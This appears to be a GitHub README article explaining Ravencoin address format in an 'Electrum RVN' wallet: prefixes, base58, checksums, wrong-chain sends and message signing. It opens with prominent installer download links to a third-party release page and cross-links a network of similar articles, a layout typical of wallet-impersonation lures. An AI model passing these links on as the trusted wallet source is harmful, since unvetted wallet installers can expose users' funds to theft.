![Electrum RVN](assets/banner-article.png)

# Ravencoin Address Format in Electrum RVN

<!-- compact-download-block -->

<p align="center">What the leading R tells you before you send</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
A Ravencoin address is a base58 string that starts with a capital `R`. Electrum RVN accepts only addresses that validate on the Ravencoin network, so a Bitcoin address, an `0x` Ethereum-style address or a mistyped string is refused before a transaction is built. That refusal is the wallet protecting you from an unrecoverable send.

## What the string actually is

An address is not a random label; it is an encoded public key hash with a network prefix and a checksum. Three parts matter when you look at one:

- **The prefix.** Ravencoin's is `R`. Bitcoin's are `1`, `3` and `bc1`; Ethereum's are `0x` followed by hexadecimal. The prefix is the fastest way to spot a wrong-network address.
- **The alphabet.** Base58 excludes characters that are easy to confuse when read aloud or copied by hand: no `0`, no `O`, no `I`, no lowercase `l`. An address containing one of those is not a valid base58 string.
- **The checksum.** The last few characters are a hash of everything before them. A single wrong character almost always breaks the checksum, which is why a typo is rejected rather than sent into the void.

That combination is why copy-paste beats retyping, and why the wallet can tell you an address is wrong before you spend anything on finding out.

## The four addresses people confuse

| What you have | Example shape | Does RVN arrive? |
| --- | --- | --- |
| Ravencoin address | `R...`, base58 | yes |
| Bitcoin address | `1...`, `3...`, `bc1...` | no - wrong network |
| Ethereum-style address | `0x...`, hexadecimal | no - different chain entirely |
| A wrapped "RVN" token address | `0x...` on an exchange's chain | no - that is a token, not RVN |

The third and fourth look identical and both fail identically: the funds go to an address on another chain that this wallet has no way to read. Nothing in Electrum RVN can reverse that, because the transaction did not happen on Ravencoin at all.

## Why an 0x address is not recoverable

An Ethereum-style transfer moves a token on a chain whose rules have nothing to do with Ravencoin's. There is no bridge, no memo field and no return path: the tokens exist on the other network, controlled by whoever holds that address's key, and that is not you.

The same is true of an exchange that offers "RVN (ERC-20)". That is a different asset with the same ticker. Withdrawing it to an `R` address cannot work, and withdrawing real RVN to the token address cannot work either - the two are on separate networks in both directions. [Wrong address sends in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/wrong-address-sends-in-electrum-rvn.md) is the full account of what can and cannot be done afterwards.

## What the wallet checks when you paste

The paste is validated locally before the transaction is built: the prefix, the base58 alphabet and the checksum. A valid address produces a summary with the amount and the fee - the fee comes from the rate the server reports, [explained here](https://github.com/electrum-source/download-and-setup/blob/main/electrum-rvn-transaction-fees-explained.md) - and an invalid one produces a refusal and no transaction.

What validation cannot check is **whose** address it is. A perfectly valid `R` address belonging to a stranger passes every test. That is why the second check is human: compare the first four and last four characters against the source you trust, and treat an address that changed between the message and your clipboard as theft rather than error. [how safe is Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/how-safe-is-electrum-rvn.md) covers the clipboard-swapping pattern.

## Addresses for different purposes

- **Receiving.** Any address the wallet has shown you. Every one stays valid; a new one appears after use for privacy, not because the old one expires - [how to find your Electrum RVN wallet address](https://github.com/electrum-source/download-and-setup/blob/main/find-your-electrum-rvn-wallet-address.md).
- **Change.** The wallet returns the remainder of a spend to an address of its own, which is why a balance does not vanish after a partial send.
- **Asset transfers.** The same `R` addresses hold assets; an asset transfer is a normal transaction carrying an asset payload, so the address rules do not change.
- **Exchange deposits.** The exchange's address, on the Ravencoin network. It is theirs, not yours, and it is usually retired after use: buying is [buying Ravencoin for Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/buying-ravencoin-for-electrum-rvn.md), and the return trip is [selling Ravencoin with Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/selling-ravencoin-with-electrum-rvn.md).

## Signing a message to prove an address is yours

An address is public, so possession is not proof. If you need to prove control - to a buyer, an escrow, a community - sign a message with the address's key and let the other side verify it. The wallet supports message signing, and it never requires revealing the key or the seed to do it.

That is also the right response to anyone who asks you to "verify" an address by sending a small amount to it first: signing costs nothing, and the request to send is usually a setup for something else.

## Testnet and lookalike addresses

Ravencoin has a test network with its own address prefix, and testnet coins are worthless by design. A wallet pointed at testnet will happily accept a testnet address and send testnet funds; if a "payment" never appears on a mainnet explorer, check which network the wallet is on before assuming theft, and switch back to mainnet before sending anything real.

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0.

## FAQ

### How long is a Ravencoin address?

It is a base58 string starting with `R`, and it has no separator, no spaces and no `0x`. Judge it by the prefix, the alphabet and the checksum rather than by counting characters.

### Can I send RVN to a Bitcoin address?

No. The wallet refuses it, and a service that sends RVN to a Bitcoin address has made a wrong-network withdrawal that cannot be undone from here.

### Why does my exchange show a different address each time?

Deposit addresses are often single-use, generated per customer or per deposit. Use the one currently shown in the withdrawal screen, and never reuse an old one from a screenshot.

### Is an address case-sensitive?

Base58 is case-sensitive, so `R` and `r` are different characters and only `R` begins a mainnet Ravencoin address. Copy rather than retype, and never "fix" the case of a pasted address.

### Can two different addresses hold the same funds?

No. An address controls its own coins. What can happen is two addresses in the same wallet - a receiving address and a change address - holding parts of what you think of as one balance, which is normal and not a duplication.

<!-- related-articles -->

## Related articles

- [Wrong Address Sends in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/wrong-address-sends-in-electrum-rvn.md)
- [Electrum RVN Transaction Fees Explained](https://github.com/electrum-source/download-and-setup/blob/main/electrum-rvn-transaction-fees-explained.md)
- [How Safe Is Electrum RVN?](https://github.com/electrum-source/passphrase-backup/blob/main/how-safe-is-electrum-rvn.md)
- [How to Find Your Electrum RVN Wallet Address](https://github.com/electrum-source/download-and-setup/blob/main/find-your-electrum-rvn-wallet-address.md)
